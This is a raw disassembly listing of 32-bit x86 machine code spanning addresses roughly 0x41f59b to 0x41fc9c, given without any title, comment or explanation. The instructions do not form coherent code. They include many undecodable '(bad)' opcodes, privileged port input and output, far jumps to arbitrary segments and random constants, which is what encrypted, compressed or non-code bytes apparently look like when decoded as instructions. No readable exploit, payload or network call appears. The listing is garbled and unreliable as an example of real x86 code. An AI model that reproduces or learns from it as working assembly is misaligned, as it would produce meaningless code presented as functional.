  41f59b:	mov    al,ds:0x3410f652
  41f5a0:	pop    esp
  41f5a1:	add    eax,0xb4b9bd26
  41f5a6:	stos   BYTE PTR es:[edi],al
  41f5a7:	enter  0xccf9,0x98
  41f5ab:	sbb    DWORD PTR [esi],eax
  41f5ad:	add    DWORD PTR [eax-0x38],ecx
  41f5b0:	add    BYTE PTR [edx],0xc0
  41f5b3:	dec    esp
  41f5b4:	js     0x41f5cf
  41f5b6:	test   DWORD PTR [edx+0x368f9cb],edx
  41f5bc:	cmc    
  41f5bd:	pop    edx
  41f5be:	sbb    cl,BYTE PTR [esp+ebp*1+0x16]
  41f5c2:	mov    DWORD PTR [edx+0x15],eax
  41f5c5:	and    al,0x5a
  41f5c7:	push   ecx
  41f5c8:	daa    
  41f5c9:	pop    ebx
  41f5ca:	int3   
  41f5cb:	aaa    
  41f5cc:	mov    dl,0xa
  41f5ce:	(bad)  
  41f5d0:	jae    0x41f59b
  41f5d2:	adc    DWORD PTR ds:0x262c9879,esp
  41f5d8:	lds    edi,FWORD PTR [edi+0x10cc12d7]
  41f5de:	ds mov eax,0x4329c703
  41f5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5e5:	out    dx,eax
  41f5e6:	stos   DWORD PTR es:[edi],eax
  41f5e7:	ret    
  41f5e8:	dec    edx
  41f5e9:	inc    ebp
  41f5ea:	or     DWORD PTR [edi-0x2015673d],0x5482f8f6
  41f5f4:	out    0x63,eax
  41f5f6:	cmp    BYTE PTR [edx],ah
  41f5f8:	push   ss
  41f5f9:	xor    eax,0x2cb2904b
  41f5fe:	jge    0x41f5c0
  41f600:	xchg   esp,eax
  41f601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f602:	mov    bh,0xab
  41f604:	repnz cli 
  41f606:	cmc    
  41f607:	adc    al,0x46
  41f609:	outs   dx,BYTE PTR ds:[esi]
  41f60a:	add    al,0x75
  41f60c:	xchg   DWORD PTR [ecx],edi
  41f60e:	add    BYTE PTR [eax],0xbb
  41f611:	jno    0x41f5c4
  41f613:	inc    edi
  41f614:	jb     0x41f5bd
  41f616:	hlt    
  41f617:	sub    BYTE PTR [edi],bh
  41f619:	add    eax,0x51086f4b
  41f61e:	arpl   WORD PTR [esi+0x34],sp
  41f621:	inc    ebx
  41f622:	dec    eax
  41f623:	cmp    dh,BYTE PTR [ebx+0x11]
  41f626:	fcomp  DWORD PTR [ecx+edi*8]
  41f629:	push   0xf80e504e
  41f62e:	xchg   esi,eax
  41f62f:	mov    edi,0xdb9d89f1
  41f634:	(bad)
  41f637:	sub    DWORD PTR [eax],ebx
  41f639:	mov    ch,0x3
  41f63b:	and    edx,DWORD PTR [edi-0x3e]
  41f63e:	mov    edi,0xf8d9d4d4
  41f643:	mov    bh,0x8d
  41f645:	jo     0x41f619
  41f647:	push   edi
  41f648:	and    DWORD PTR [ecx],0x55b98ffb
  41f64e:	xor    al,BYTE PTR [esi]
  41f650:	repnz mov ebp,0x87410688
  41f656:	les    ebp,FWORD PTR [edx]
  41f658:	push   esi
  41f659:	add    DWORD PTR [eax],0xeccdc015
  41f65f:	inc    esi
  41f660:	xchg   esp,eax
  41f661:	or     eax,0x2e7b0db7
  41f666:	imul   edx,DWORD PTR [edx],0x44
  41f669:	mov    dh,0x40
  41f66b:	xchg   BYTE PTR [edx+0x49d93ae0],dh
  41f671:	mov    cl,0x54
  41f673:	jnp    0x41f6bd
  41f675:	(bad)  
  41f676:	in     eax,dx
  41f677:	push   ss
  41f678:	mov    edx,esi
  41f67a:	mov    dh,0xfa
  41f67c:	sbb    BYTE PTR [esp+edi*2-0x75],ch
  41f680:	xchg   esi,eax
  41f681:	sub    edx,DWORD PTR ds:0x54353b1a
  41f687:	mov    edi,0xd0cec442
  41f68c:	cli    
  41f68d:	stos   BYTE PTR es:[edi],al
  41f68e:	sbb    BYTE PTR [edx+0x169facf5],al
  41f694:	sbb    al,0x72
  41f696:	test   esi,0x83aad1f6
  41f69c:	sbb    BYTE PTR [edi-0x6e],dl
  41f69f:	daa    
  41f6a0:	xchg   esp,eax
  41f6a1:	rep stos DWORD PTR es:[edi],eax
  41f6a3:	out    0xfe,al
  41f6a5:	jp     0x41f6fe
  41f6a7:	leave  
  41f6a8:	xchg   ebx,eax
  41f6a9:	ret    0xa2b0
  41f6ac:	pushf  
  41f6ad:	enter  0xcbec,0x3d
  41f6b1:	jae    0x41f672
  41f6b3:	and    bl,BYTE PTR [eax]
  41f6b5:	adc    cl,BYTE PTR [edi+0x6527813d]
  41f6bb:	mov    WORD PTR [ebx],?
  41f6bd:	jo     0x41f711
  41f6bf:	inc    ebp
  41f6c0:	(bad)  
  41f6c1:	imul   esi,eax,0xffffffc8
  41f6c4:	frstor [edx-0x32]
  41f6c7:	cs lahf 
  41f6c9:	or     al,BYTE PTR [ebp-0x30352315]
  41f6cf:	test   DWORD PTR ds:0x11625104,esp
  41f6d5:	test   al,0xaa
  41f6d7:	clc    
  41f6d8:	adc    DWORD PTR ds:0x9c57988,edi
  41f6de:	and    al,0x8f
  41f6e0:	adc    DWORD PTR [edx],esi
  41f6e2:	adc    DWORD PTR [edx*2+0x3aa7f6fa],esp
  41f6e9:	cdq    
  41f6ea:	out    dx,eax
  41f6eb:	pusha  
  41f6ec:	outs   dx,DWORD PTR ds:[esi]
  41f6ed:	xchg   ebx,eax
  41f6ee:	arpl   WORD PTR [edi],di
  41f6f0:	or     esp,DWORD PTR [edi+0x59]
  41f6f3:	fstp   QWORD PTR [eax]
  41f6f5:	dec    esp
  41f6f6:	xchg   ebp,eax
  41f6f7:	pop    ecx
  41f6f8:	pop    ebp
  41f6f9:	jnp    0x41f740
  41f6fb:	dec    ebx
  41f6fc:	icebp  
  41f6fd:	inc    ebp
  41f6fe:	cmp    eax,0xafd47d80
  41f703:	pop    ecx
  41f704:	loope  0x41f75d
  41f706:	jb     0x41f6db
  41f708:	xlat   BYTE PTR ds:[ebx]
  41f709:	cs push edi
  41f70b:	jo     0x41f772
  41f70d:	xchg   ebp,eax
  41f70e:	in     al,dx
  41f70f:	fwait
  41f710:	call   0x42a4:0x5739fb4f
  41f717:	ss jns 0x41f737
  41f71a:	dec    edi
  41f71b:	mov    cl,0x66
  41f71d:	and    ebp,DWORD PTR [ecx]
  41f71f:	xor    BYTE PTR [esi-0xc3c4db],0xfe
  41f726:	cld    
  41f727:	cli    
  41f728:	xchg   edx,eax
  41f729:	mov    ecx,0xf598f346
  41f72e:	xchg   bl,ch
  41f730:	lahf   
  41f731:	sbb    eax,0x41f6c35e
  41f736:	pop    edx
  41f737:	ins    DWORD PTR es:[edi],dx
  41f738:	or     DWORD PTR [edx],eax
  41f73a:	mov    WORD PTR [eax+0x1f5b4c7b],ds
  41f740:	call   0x1899:0x47389768
  41f747:	fld    QWORD PTR [edi-0x36819260]
  41f74d:	add    BYTE PTR [ebp-0x35eb8f62],al
  41f753:	push   ss
  41f754:	or     BYTE PTR [ebp+0x73],0x75
  41f758:	add    ch,bl
  41f75a:	stc    
  41f75b:	push   0xffffffe4
  41f75d:	fdivrp st(7),st
  41f75f:	retf   0xe34f
  41f762:	push   esi
  41f763:	fs dec eax
  41f765:	mov    dh,0x34
  41f767:	bound  ecx,QWORD PTR [ebp+0x31]
  41f76a:	pop    edi
  41f76b:	push   esi
  41f76c:	pop    esi
  41f76d:	inc    ecx
  41f76e:	jg     0x41f7cc
  41f770:	ficom  DWORD PTR [edi+0x3b8f6d5]
  41f776:	or     DWORD PTR [edx],ecx
  41f778:	xor    BYTE PTR [edi],cl
  41f77a:	xchg   ecx,eax
  41f77b:	repnz and al,0xea
  41f77e:	dec    ebp
  41f77f:	(bad)  
  41f780:	and    eax,DWORD PTR [ecx+0x68]
  41f783:	jmp    0x87b3:0x84c74d5
  41f78a:	imul   edx,DWORD PTR [edx+0x78d20028],0x35
  41f791:	cmp    edx,edx
  41f793:	mov    WORD PTR [eax],gs
  41f795:	int    0xec
  41f797:	lods   al,BYTE PTR ds:[esi]
  41f798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f799:	repz repz pusha 
  41f79c:	mov    edi,es
  41f79e:	div    dl
  41f7a0:	add    eax,0x401f5790
  41f7a5:	icebp  
  41f7a6:	iret   
  41f7a7:	in     eax,dx
  41f7a8:	pop    esp
  41f7a9:	lea    eax,[ebp+0xfe501fe]
  41f7af:	lahf   
  41f7b0:	fcmovu st,st(7)
  41f7b2:	xor    bh,BYTE PTR [edi-0x3851489c]
  41f7b8:	int3   
  41f7b9:	mov    ds:0xf3ab0455,eax
  41f7be:	jmp    0x41f7cf
  41f7c0:	cmp    BYTE PTR [esi+edi*2],bh
  41f7c3:	mov    BYTE PTR [ebx+0x25],ch
  41f7c6:	or     eax,0x759d5f6f
  41f7cb:	fnstsw WORD PTR [ecx-0x3a]
  41f7ce:	js     0x41f7f5
  41f7d0:	fs fdiv st(1),st
  41f7d3:	inc    ebp
  41f7d4:	push   ebp
  41f7d5:	pop    esp
  41f7d6:	dec    ecx
  41f7d7:	sub    BYTE PTR [esi-0x295d1813],cl
  41f7dd:	dec    ecx
  41f7de:	sub    BYTE PTR [edx],ch
  41f7e0:	xor    esp,DWORD PTR [esi+esi*2-0x42569979]
  41f7e7:	dec    edx
  41f7e8:	stos   BYTE PTR es:[edi],al
  41f7e9:	das    
  41f7ea:	xchg   edx,eax
  41f7eb:	add    DWORD PTR fs:[eax-0x3f4e491d],edi
  41f7f2:	jl     0x41f7af
  41f7f4:	pop    eax
  41f7f5:	add    DWORD PTR [ebp-0x33],ebx
  41f7f8:	cwde   
  41f7f9:	rcr    cl,0xa2
  41f7fc:	mov    edx,0xfa3a3be1
  41f801:	test   BYTE PTR [esi+0x7b],0x4f
  41f805:	pusha  
  41f806:	aaa    
  41f807:	data16 jbe 0x41f80a
  41f80a:	dec    edi
  41f80b:	xchg   ebx,eax
  41f80c:	mov    ebp,0xc5451721
  41f811:	and    esi,DWORD PTR [eax+0x2d]
  41f814:	shl    ah,0x5e
  41f817:	sahf   
  41f818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f819:	pop    ss
  41f81a:	in     eax,0xd5
  41f81c:	mov    dh,0xb0
  41f81e:	fsubr  DWORD PTR [eax+0x70]
  41f821:	jo     0x41f7be
  41f823:	mov    al,0xe2
  41f825:	lods   al,BYTE PTR ds:[esi]
  41f826:	cdq    
  41f827:	(bad)  
  41f828:	in     al,0xa1
  41f82a:	xchg   edx,eax
  41f82b:	cli    
  41f82c:	repnz mov ch,0x8d
  41f82f:	or     DWORD PTR [edi],esi
  41f831:	and    BYTE PTR [eax],0xa7
  41f834:	gs jle 0x41f89a
  41f837:	ja     0x41f87d
  41f839:	ss pop edi
  41f83b:	div    BYTE PTR [ebx-0x6852a39f]
  41f841:	jns    0x41f876
  41f843:	sbb    eax,DWORD PTR [ebp+0x588467f5]
  41f849:	sbb    cl,BYTE PTR [edx-0x37]
  41f84c:	xchg   DWORD PTR [esi+0x1b],esp
  41f84f:	retf   
  41f850:	sub    BYTE PTR [ecx+esi*1+0x72],dh
  41f854:	pop    ecx
  41f855:	dec    ecx
  41f856:	xchg   ebx,eax
  41f857:	or     BYTE PTR [edx*4+0x5f0f92ac],ah
  41f85e:	xchg   esp,eax
  41f85f:	fiadd  WORD PTR [eax+0x1e41281d]
  41f865:	jl     0x41f88a
  41f867:	pop    es
  41f868:	adc    bh,0xb2
  41f86b:	outs   dx,BYTE PTR ds:[esi]
  41f86c:	fnstsw WORD PTR [eax+0x3190615a]
  41f872:	inc    edi
  41f873:	cli    
  41f874:	push   edx
  41f875:	sub    DWORD PTR [ecx+0x63],ebp
  41f878:	mov    edi,ss
  41f87a:	mov    dh,0xe6
  41f87c:	sbb    eax,0xa0af48a
  41f881:	neg    DWORD PTR [ecx]
  41f883:	(bad)  
  41f884:	fnstenv [ecx+0xf661c69]
  41f88a:	je     0x41f845
  41f88c:	and    eax,0xf62aab49
  41f891:	lods   eax,DWORD PTR ds:[esi]
  41f892:	popf   
  41f893:	jge    0x41f81b
  41f895:	fild   QWORD PTR [ecx-0x14]
  41f898:	xacquire xchg BYTE PTR [ebp-0x474125ae],ah
  41f89f:	sbb    edx,DWORD PTR fs:[eax]
  41f8a2:	out    0x4a,al
  41f8a4:	or     al,dl
  41f8a6:	stos   DWORD PTR es:[edi],eax
  41f8a7:	rol    di,0xe6
  41f8ab:	add    BYTE PTR [esi+0x17ca12b4],dl
  41f8b1:	push   edi
  41f8b2:	and    eax,0x5fd91ff
  41f8b7:	imul   eax,DWORD PTR [edi],0x1c
  41f8ba:	shl    ebp,0x2b
  41f8bd:	fsubr  st,st(5)
  41f8bf:	pushf  
  41f8c0:	adc    ecx,DWORD PTR [eax-0x46fea6f9]
  41f8c6:	popf   
  41f8c7:	cmp    al,bl
  41f8c9:	lahf   
  41f8ca:	in     eax,dx
  41f8cb:	inc    ebx
  41f8cc:	mov    edx,?
  41f8ce:	or     eax,DWORD PTR [ebp+0x5d]
  41f8d1:	sahf   
  41f8d2:	fsubr  DWORD PTR [edx]
  41f8d4:	(bad)  
  41f8d5:	stc    
  41f8d6:	push   es
  41f8d7:	inc    ebx
  41f8d8:	les    ecx,FWORD PTR [eax-0x301f4861]
  41f8de:	push   ebp
  41f8df:	adc    ch,bl
  41f8e1:	fdiv   QWORD PTR [edi+0x5372ce71]
  41f8e7:	sbb    al,0xf
  41f8e9:	hlt    
  41f8ea:	xlat   BYTE PTR ds:[ebx]
  41f8eb:	and    al,0xf7
  41f8ed:	jmp    0xff3:0x5ced0b86
  41f8f4:	inc    edi
  41f8f5:	(bad)  
  41f8f6:	jle    0x41f924
  41f8f8:	lock jmp 0x41f959
  41f8fb:	mov    al,ds:0x6f790e77
  41f900:	mov    BYTE PTR [edx+eiz*8+0x4763f6a6],bl
  41f907:	cli    
  41f908:	enter  0x1f7,0x24
  41f90c:	push   es
  41f90d:	inc    eax
  41f90e:	and    esi,esp
  41f910:	arpl   WORD PTR [ebx],ax
  41f912:	or     DWORD PTR [ebx-0x7dba063b],ecx
  41f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f919:	pop    edi
  41f91a:	sar    BYTE PTR [ecx+0x62],1
  41f91d:	mov    ebp,0xeb30098b
  41f922:	sbb    al,0xf0
  41f924:	xlat   BYTE PTR ds:[ebx]
  41f925:	popf   
  41f926:	outs   dx,DWORD PTR ds:[esi]
  41f927:	out    0x76,eax
  41f929:	jo     0x41f8ab
  41f92b:	cld    
  41f92c:	pop    ebp
  41f92d:	adc    cl,cl
  41f92f:	fstp   st(2)
  41f931:	xchg   esp,eax
  41f932:	jp     0x41f8e7
  41f934:	push   ebx
  41f935:	and    DWORD PTR [eax-0x3b],edx
  41f938:	xchg   ch,al
  41f93a:	in     eax,0xa2
  41f93c:	xor    dh,al
  41f93e:	mov    ss:0xb1a7df9d,eax
  41f944:	pop    edi
  41f945:	(bad)  
  41f946:	aad    0x8b
  41f948:	dec    ebx
  41f949:	loope  0x41f8f5
  41f94b:	adc    DWORD PTR [edi],esi
  41f94d:	(bad)  
  41f94e:	push   esp
  41f94f:	lods   eax,DWORD PTR ds:[esi]
  41f950:	pusha  
  41f951:	adc    BYTE PTR [edi+0x15],dh
  41f954:	shl    BYTE PTR [esi-0x5bc6cbb9],cl
  41f95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f95b:	in     al,dx
  41f95c:	popa   
  41f95d:	pushf  
  41f95e:	daa    
  41f95f:	arpl   WORD PTR [eax],bx
  41f961:	jl     0x41f923
  41f963:	push   eax
  41f964:	(bad)  
  41f965:	fimul  WORD PTR [ecx]
  41f967:	mov    esi,0x855176cc
  41f96c:	pop    ss
  41f96d:	sub    ebx,edi
  41f96f:	lahf   
  41f970:	iret   
  41f971:	cld    
  41f972:	xor    al,0x52
  41f974:	add    esp,edx
  41f976:	aam    0x1c
  41f978:	ret    
  41f979:	jle    0x41f964
  41f97b:	sub    esp,ebx
  41f97d:	xor    eax,0xb6a72ef1
  41f982:	push   edi
  41f983:	inc    eax
  41f984:	test   eax,0xefcaa459
  41f989:	int3   
  41f98a:	data16 fcmovnu st,st(4)
  41f98d:	sar    ah,1
  41f98f:	cmp    al,0xb6
  41f991:	xchg   ecx,eax
  41f992:	clc    
  41f993:	and    ecx,DWORD PTR [ebx]
  41f995:	sar    BYTE PTR [edx],0x18
  41f998:	ret    
  41f999:	in     eax,dx
  41f99a:	jns    0x41f9de
  41f99c:	ror    DWORD PTR [ebx+0x3a60706b],0x75
  41f9a3:	gs pop es
  41f9a5:	shl    dl,cl
  41f9a7:	out    dx,al
  41f9a8:	mov    al,0x55
  41f9aa:	stos   DWORD PTR es:[edi],eax
  41f9ab:	pop    ebx
  41f9ac:	inc    eax
  41f9ad:	and    BYTE PTR [ebp+0x2e5219e3],cl
  41f9b3:	xchg   ebp,eax
  41f9b4:	lods   eax,DWORD PTR ds:[esi]
  41f9b5:	call   DWORD PTR [eax-0x24]
  41f9b8:	push   eax
  41f9b9:	and    BYTE PTR [edx+eiz*8+0x2b],cl
  41f9bd:	arpl   WORD PTR [ebp+0x175456d7],ax
  41f9c3:	mov    edi,0x4101adb1
  41f9c8:	push   edi
  41f9c9:	xchg   esp,eax
  41f9ca:	jbe    0x41fa36
  41f9cc:	nop
  41f9cd:	cmp    esi,DWORD PTR [esi-0x7a3e405c]
  41f9d3:	cmp    BYTE PTR [ebx+0x39],0x2a
  41f9d7:	mov    ch,0xec
  41f9d9:	leave  
  41f9da:	mov    esi,0xf801a3ac
  41f9df:	sti    
  41f9e0:	clc    
  41f9e1:	mov    DWORD PTR [edx+0x1a183d1b],edx
  41f9e7:	adc    DWORD PTR [ecx],ecx
  41f9e9:	sub    BYTE PTR [esi-0xadb36a3],dl
  41f9ef:	dec    esi
  41f9f0:	imul   esp,DWORD PTR [ecx-0x10],0xc4cce5db
  41f9f7:	ins    BYTE PTR es:[edi],dx
  41f9f8:	xchg   ch,dh
  41f9fa:	sbb    DWORD PTR [ebx+0x1ef0d16e],esi
  41fa00:	fcomp  st(4)
  41fa02:	mov    ebp,0x843a0282
  41fa07:	enter  0xca54,0xfa
  41fa0b:	(bad)
  41fa0e:	(bad)  
  41fa0f:	(bad)  
  41fa10:	(bad)  
  41fa11:	icebp  
  41fa12:	sbb    ebp,DWORD PTR [esi+0x22]
  41fa15:	das    
  41fa16:	inc    esi
  41fa17:	addr16 sbb ebp,edi
  41fa1a:	push   cs
  41fa1b:	aas    
  41fa1c:	adc    BYTE PTR [ecx+ecx*8],bl
  41fa1f:	push   ebx
  41fa20:	lahf   
  41fa21:	inc    eax
  41fa22:	ds test eax,ebp
  41fa25:	lods   al,BYTE PTR ds:[esi]
  41fa26:	pop    esi
  41fa27:	ja     0x41fa2d
  41fa29:	dec    ebp
  41fa2a:	adc    ecx,DWORD PTR [ebx]
  41fa2c:	cmp    BYTE PTR [ecx+0x2fb4a61b],dh
  41fa32:	push   eax
  41fa33:	mov    ebx,0x12577ac2
  41fa38:	cli    
  41fa39:	scas   al,BYTE PTR es:[edi]
  41fa3a:	iret   
  41fa3b:	jbe    0x41fa0c
  41fa3d:	pop    es
  41fa3e:	sub    BYTE PTR [ecx+0x51],bh
  41fa41:	push   ds
  41fa42:	outs   dx,BYTE PTR ds:[esi]
  41fa43:	pop    esp
  41fa44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa45:	xor    DWORD PTR [eax+edx*2-0x5e0f77b4],0xe93b655e
  41fa50:	rcl    DWORD PTR [eax-0x75],0x91
  41fa54:	jno    0x41fa22
  41fa56:	stos   BYTE PTR es:[edi],al
  41fa57:	adc    al,0x11
  41fa59:	and    dh,BYTE PTR [edx+eiz*1+0x5d13b1e1]
  41fa60:	nop
  41fa61:	mov    ah,0x1
  41fa63:	or     esp,DWORD PTR [esi]
  41fa65:	add    eax,0x13ffd532
  41fa6a:	fcmovnu st,st(0)
  41fa6c:	popf   
  41fa6d:	arpl   WORD PTR [edx],bp
  41fa6f:	add    bh,BYTE PTR [eax+0x48]
  41fa72:	cmp    ah,BYTE PTR [edx+0x2a]
  41fa75:	js     0x41fa40
  41fa77:	cmp    cl,BYTE PTR [ecx+edi*4]
  41fa7a:	xor    dl,0x83
  41fa7d:	retf   0x86f8
  41fa80:	nop
  41fa81:	fnsave [edx-0x5c]
  41fa84:	in     al,dx
  41fa85:	dec    edx
  41fa86:	xor    al,0xad
  41fa88:	pop    eax
  41fa89:	pop    ebp
  41fa8a:	aas    
  41fa8b:	inc    ebp
  41fa8c:	gs icebp 
  41fa8e:	lods   eax,DWORD PTR ds:[esi]
  41fa8f:	idiv   BYTE PTR [edx+edi*8-0x753ebc1b]
  41fa96:	sub    edi,0xffffffa9
  41fa99:	fwait
  41fa9a:	xchg   edx,eax
  41fa9b:	call   0x887c7d39
  41faa0:	leave  
  41faa1:	cmp    DWORD PTR [esi],0x6d94cf4b
  41faa7:	xchg   DWORD PTR [esi],ebp
  41faa9:	jmp    0xf513:0x6df6e546
  41fab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fab1:	fmul   DWORD PTR [edi+eiz*4+0x28ec10de]
  41fab8:	add    edi,edx
  41faba:	pop    ebp
  41fabb:	cdq    
  41fabc:	lods   al,BYTE PTR ds:[esi]
  41fabd:	fwait
  41fabe:	nop
  41fabf:	shl    DWORD PTR [edx],1
  41fac1:	retf   
  41fac2:	xchg   edx,eax
  41fac3:	sbb    al,0xd9
  41fac5:	sbb    BYTE PTR [edi+ecx*4+0x31],0x93
  41faca:	lahf   
  41facb:	pop    ss
  41facc:	sti    
  41facd:	outs   dx,DWORD PTR ds:[esi]
  41face:	in     al,dx
  41facf:	mov    ecx,0xbbdc2afb
  41fad4:	dec    edi
  41fad5:	and    esp,ebp
  41fad7:	in     eax,0xa8
  41fad9:	ror    DWORD PTR [ebp+0x7f86b18f],1
  41fadf:	push   ecx
  41fae0:	in     eax,0xba
  41fae2:	sbb    esp,DWORD PTR [ebx+0x25b7c42d]
  41fae8:	mov    eax,ds:0x2dfc28ad
  41faed:	cmp    DWORD PTR [esi+0x4d],edx
  41faf0:	push   ebx
  41faf1:	jle    0x41fb5d
  41faf3:	inc    edx
  41faf4:	jp     0x41fb3d
  41faf6:	mov    cl,0x71
  41faf8:	sub    ebx,DWORD PTR [eax]
  41fafa:	add    al,0x7f
  41fafc:	mov    ch,0xe3
  41fafe:	pop    edx
  41faff:	jbe    0x41fb05
  41fb01:	xchg   ebx,eax
  41fb02:	adc    eax,0x62021507
  41fb07:	jb     0x41fadb
  41fb09:	jge    0x41fac3
  41fb0b:	loope  0x41faa1
  41fb0d:	enter  0xe681,0x72
  41fb11:	hlt    
  41fb12:	jnp    0x41fb4c
  41fb14:	inc    eax
  41fb15:	pusha  
  41fb16:	dec    edx
  41fb17:	outs   dx,BYTE PTR ds:[esi]
  41fb18:	sub    DWORD PTR [ebx+0x77],edi
  41fb1b:	dec    esp
  41fb1c:	push   cs
  41fb1d:	xor    DWORD PTR [eax],esi
  41fb1f:	stc    
  41fb20:	jae    0x41fb80
  41fb22:	add    al,BYTE PTR [ecx-0x5fa33b7c]
  41fb28:	jb     0x41fafe
  41fb2a:	push   edx
  41fb2b:	test   DWORD PTR [edi],edx
  41fb2d:	(bad)  
  41fb2e:	mov    eax,ds:0xf4a73455
  41fb33:	jbe    0x41fbac
  41fb35:	mov    dl,0x96
  41fb37:	pop    es
  41fb38:	jecxz  0x41fb23
  41fb3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb3b:	or     DWORD PTR [ebx+0x36],edi
  41fb3e:	ins    DWORD PTR es:[edi],dx
  41fb3f:	xchg   DWORD PTR [edx-0xf],ecx
  41fb42:	jmp    0x51b7:0x85203851
  41fb49:	sbb    ch,BYTE PTR [edi+edi*4-0x6ac19b3e]
  41fb50:	push   ss
  41fb51:	xchg   ebp,eax
  41fb52:	push   ebp
  41fb53:	sub    dh,0x7b
  41fb56:	inc    esi
  41fb57:	xlat   BYTE PTR ds:[ebx]
  41fb58:	jae    0x41fb7f
  41fb5a:	out    0xa4,al
  41fb5c:	sti    
  41fb5d:	and    ebp,eax
  41fb5f:	add    ch,BYTE PTR [eax-0x40]
  41fb62:	push   ebx
  41fb63:	test   eax,0x656a1e1f
  41fb68:	add    al,0x6e
  41fb6a:	jo     0x41fbcc
  41fb6c:	hlt    
  41fb6d:	in     al,0xd6
  41fb6f:	(bad)  
  41fb70:	lock add cl,BYTE PTR [esi]
  41fb73:	jl     0x41fb98
  41fb75:	xchg   ecx,eax
  41fb76:	pop    edx
  41fb77:	mov    ds,ebp
  41fb79:	sub    eax,0xc8dfa609
  41fb7e:	dec    esi
  41fb7f:	inc    DWORD PTR [edi+0x68eb96e8]
  41fb85:	add    eax,0x116b9cc6
  41fb8a:	xchg   DWORD PTR [ebx+eax*4],edi
  41fb8d:	sbb    BYTE PTR [eax],bh
  41fb8f:	dec    edx
  41fb90:	cmc    
  41fb91:	es std 
  41fb93:	sti    
  41fb94:	js     0x41fb93
  41fb96:	inc    esp
  41fb97:	icebp  
  41fb98:	xlat   BYTE PTR ds:[ebx]
  41fb99:	sbb    eax,0x25fa6a49
  41fb9e:	adc    DWORD PTR [eax-0x10],ebp
  41fba1:	mov    bh,BYTE PTR [ecx]
  41fba3:	mov    esi,0x18b33994
  41fba8:	add    al,0x4e
  41fbaa:	add    BYTE PTR [ebx+0x72],al
  41fbad:	mov    edx,0xf459a30
  41fbb2:	push   es
  41fbb3:	ins    BYTE PTR es:[edi],dx
  41fbb4:	cmc    
  41fbb5:	add    ecx,DWORD PTR [ebp+0x26]
  41fbb8:	in     al,dx
  41fbb9:	mov    eax,0x8cc18114
  41fbbe:	sbb    cl,BYTE PTR [ebp+0x4a]
  41fbc1:	fisttp WORD PTR [esi]
  41fbc3:	mov    al,0xbc
  41fbc5:	in     al,0x3b
  41fbc7:	mov    esp,0xb5add84f
  41fbcc:	pop    esi
  41fbcd:	xor    BYTE PTR [edx-0x47],dh
  41fbd0:	scas   al,BYTE PTR es:[edi]
  41fbd1:	imul   ecx,DWORD PTR [edx+0xa],0xa
  41fbd5:	clc    
  41fbd6:	push   ds
  41fbd7:	ds sub ecx,eax
  41fbda:	int    0xf7
  41fbdc:	mov    ebp,0xbecbf243
  41fbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbe2:	dec    edi
  41fbe3:	test   ebp,eax
  41fbe5:	retf   0x5c2c
  41fbe8:	push   0xffffffe2
  41fbea:	jle    0x41fbeb
  41fbec:	xchg   BYTE PTR [eax-0x80],bh
  41fbef:	push   ecx
  41fbf0:	gs pop edi
  41fbf2:	sti    
  41fbf3:	jne    0x41fc0e
  41fbf5:	add    esi,edi
  41fbf7:	retf   0x3e71
  41fbfa:	stos   DWORD PTR es:[edi],eax
  41fbfb:	sbb    BYTE PTR [ebx-0xe2eab4],0x3b
  41fc02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc03:	pop    eax
  41fc04:	cmp    bh,BYTE PTR [ebx-0x12f125e1]
  41fc0a:	inc    esp
  41fc0b:	dec    edi
  41fc0c:	nop
  41fc0d:	dec    esi
  41fc0e:	sti    
  41fc0f:	into   
  41fc10:	xchg   ebp,eax
  41fc11:	stos   DWORD PTR es:[edi],eax
  41fc12:	push   cs
  41fc13:	call   FWORD PTR [edx+0x28]
  41fc16:	pop    edx
  41fc17:	aad    0xcb
  41fc19:	mov    BYTE PTR [edi+0x1b],bl
  41fc1c:	push   ss
  41fc1d:	outs   dx,DWORD PTR ds:[esi]
  41fc1e:	cmp    BYTE PTR ds:0x3cb94222,dh
  41fc24:	xor    ch,BYTE PTR [esi-0x2e872c54]
  41fc2a:	in     al,0x76
  41fc2c:	add    eax,0xb3de9710
  41fc31:	ins    DWORD PTR es:[edi],dx
  41fc32:	ror    bh,1
  41fc34:	fistp  WORD PTR [ecx+0x74]
  41fc37:	pop    esi
  41fc38:	inc    esi
  41fc39:	or     edx,ebx
  41fc3b:	sbb    dl,BYTE PTR [edi]
  41fc3d:	cmp    BYTE PTR [esi-0x65],0x94
  41fc41:	outs   dx,BYTE PTR ds:[esi]
  41fc42:	jo     0x41fbcb
  41fc44:	std    
  41fc45:	sub    ah,BYTE PTR [esi]
  41fc47:	sub    BYTE PTR [esi-0x741dcb24],bh
  41fc4d:	fld    TBYTE PTR [ecx]
  41fc4f:	mov    edx,0xdb8d9fa1
  41fc54:	pop    edx
  41fc55:	add    eax,0xb7ef8383
  41fc5a:	lods   eax,DWORD PTR ds:[esi]
  41fc5b:	cmp    esi,DWORD PTR ds:[eax+0x1ae175e6]
  41fc62:	jp     0x41fc20
  41fc64:	cmp    cl,BYTE PTR [ecx-0x35fc8460]
  41fc6a:	test   BYTE PTR [esi-0x3e198794],bh
  41fc70:	adc    esp,DWORD PTR [edi+0x7b]
  41fc73:	rcr    BYTE PTR [ebp+edx*8+0x4f],cl
  41fc77:	pop    edx
  41fc78:	mov    al,BYTE PTR [edi+0x75]
  41fc7b:	xchg   ebx,eax
  41fc7c:	jnp    0x41fc1b
  41fc7e:	out    dx,al
  41fc7f:	xorps  xmm5,XMMWORD PTR [ecx+0x61]
  41fc83:	mov    dh,0x73
  41fc85:	aas    
  41fc86:	add    eax,0xed46c35e
  41fc8b:	jns    0x41fcfb
  41fc8d:	mov    eax,ds:0xecc7dea9
  41fc92:	mov    dl,0x36
  41fc94:	pusha  
  41fc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc97:	pushf  
  41fc98:	sub    al,0x76
  41fc9a:	sbb    DWORD PTR [edx],edi
  41fc9c:	in     eax,0x4c
